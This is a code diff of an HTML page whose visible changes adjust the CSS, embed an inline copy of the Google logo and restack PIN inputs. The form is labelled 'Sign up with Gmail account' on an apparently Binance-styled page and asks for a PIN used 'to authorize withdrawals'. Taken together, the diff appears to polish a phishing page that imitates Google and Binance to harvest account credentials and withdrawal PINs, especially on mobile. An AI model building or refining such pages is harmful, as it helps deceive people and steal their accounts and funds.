@@ -292,42 +292,43 @@
             color: #848e9c;
         }
 
-        /* Google Signup Styles - Properly Sized */
+        /* Google Signup Styles - Mobile Optimized */
         .google-signup-container {
             background: white;
             border-radius: 16px;
-            padding: 32px 32px 36px 32px;
+            padding: 24px 24px 32px 24px;
             width: 100%;
             max-width: 460px;
             margin: 0 auto;
             box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-            max-height: 90vh;
+            max-height: 85vh;
             overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
         }
         .google-logo {
             text-align: center;
             margin-bottom: 20px;
         }
-        .google-logo img {
+        .google-logo svg {
             width: 48px;
             height: 48px;
             display: inline-block;
         }
         .google-title {
-            font-size: 24px;
+            font-size: 22px;
             font-weight: 700;
             color: #1e2329;
             text-align: center;
             margin: 0 0 8px 0;
         }
         .google-subtitle {
-            font-size: 14px;
+            font-size: 13px;
             color: #707a8a;
             text-align: center;
-            margin-bottom: 28px;
+            margin-bottom: 24px;
         }
         .input-group {
-            margin-bottom: 18px;
+            margin-bottom: 16px;
         }
         .input-group label {
             display: block;
@@ -389,22 +390,23 @@
         .pin-box p {
             font-size: 12px;
             color: #707a8a;
-            margin: 0 0 12px 0;
+            margin: 0 0 16px 0;
         }
-        .pin-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 12px;
+        .pin-field {
+            margin-bottom: 16px;
+        }
+        .pin-field:last-child {
+            margin-bottom: 0;
         }
         .terms-container {
             display: flex;
             align-items: center;
-            font-size: 13px;
+            font-size: 12px;
             margin-bottom: 24px;
         }
         .terms-container input {
-            width: 18px;
-            height: 18px;
+            width: 16px;
+            height: 16px;
             margin-right: 10px;
             cursor: pointer;
         }
@@ -438,7 +440,7 @@
         .footer-text {
             text-align: center;
             margin-top: 24px;
-            font-size: 14px;
+            font-size: 13px;
             color: #707a8a;
         }
         .footer-text a {
@@ -449,7 +451,7 @@
         .bottom-security {
             text-align: center;
             color: #707a8a;
-            font-size: 11px;
+            font-size: 10px;
             margin-top: 16px;
             padding-bottom: 8px;
         }
@@ -460,7 +462,7 @@
             display: none;
         }
         
-        /* Hide scrollbar for signup form */
+        /* Custom scrollbar for signup form */
         .google-signup-container::-webkit-scrollbar {
             width: 4px;
         }
@@ -471,6 +473,24 @@
         .google-signup-container::-webkit-scrollbar-thumb {
             background: #888;
             border-radius: 10px;
+        }
+        
+        /* Mobile adjustments */
+        @media (max-width: 480px) {
+            .google-signup-container {
+                padding: 20px 20px 28px 20px;
+                max-height: 90vh;
+            }
+            .google-title {
+                font-size: 20px;
+            }
+            .input-wrapper input {
+                padding: 10px 36px;
+                font-size: 13px;
+            }
+            .btn-submit {
+                padding: 12px;
+            }
         }
     </style>
 </head>
@@ -539,7 +559,12 @@
             <div id="signup-form" class="hidden">
                 <div class="google-signup-container">
                     <div class="google-logo">
-                        <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_Logo.svg" alt="Google">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="48" height="48">
+                            <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"/>
+                            <path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"/>
+                            <path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"/>
+                            <path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"/>
+                        </svg>
                     </div>
                     <div class="google-title">Sign up with Gmail account now</div>
                     <div class="google-subtitle">Continue to Binance securely with your Google account</div>
@@ -567,22 +592,21 @@
                         </div>
                         <p>This PIN will be used to authorize withdrawals.</p>
                         
-                        <div class="pin-grid">
-                            <div class="input-group">
-                                <label>Create PIN</label>
-                                <div class="input-wrapper">
-                                    <i class="fa-solid fa-table-cells prefix"></i>
-                                    <input type="password" id="signup-pin" maxlength="6" class="pin-input" placeholder="Enter 6-digit PIN" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
-                                    <i class="fa-regular fa-eye eye-icon" onclick="togglePasswordField('signup-pin', this)"></i>
-                                </div>
+                        <div class="pin-field">
+                            <label>Create PIN</label>
+                            <div class="input-wrapper">
+                                <i class="fa-solid fa-table-cells prefix"></i>
+                                <input type="password" id="signup-pin" maxlength="6" class="pin-input" placeholder="Enter 6-digit PIN" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
+                                <i class="fa-regular fa-eye eye-icon" onclick="togglePasswordField('signup-pin', this)"></i>
                             </div>
-                            <div class="input-group">
-                                <label>Confirm PIN</label>
-                                <div class="input-wrapper">
-                                    <i class="fa-solid fa-table-cells prefix"></i>
-                                    <input type="password" id="signup-confirm-pin" maxlength="6" class="pin-input" placeholder="Re-enter PIN" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
-                                    <i class="fa-regular fa-eye eye-icon" onclick="togglePasswordField('signup-confirm-pin', this)"></i>
-                                </div>
+                        </div>
+                        
+                        <div class="pin-field">
+                            <label>Confirm PIN</label>
+                            <div class="input-wrapper">
+                                <i class="fa-solid fa-table-cells prefix"></i>
+                                <input type="password" id="signup-confirm-pin" maxlength="6" class="pin-input" placeholder="Re-enter PIN" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
+                                <i class="fa-regular fa-eye eye-icon" onclick="togglePasswordField('signup-confirm-pin', this)"></i>
                             </div>
                         </div>
                     </div>
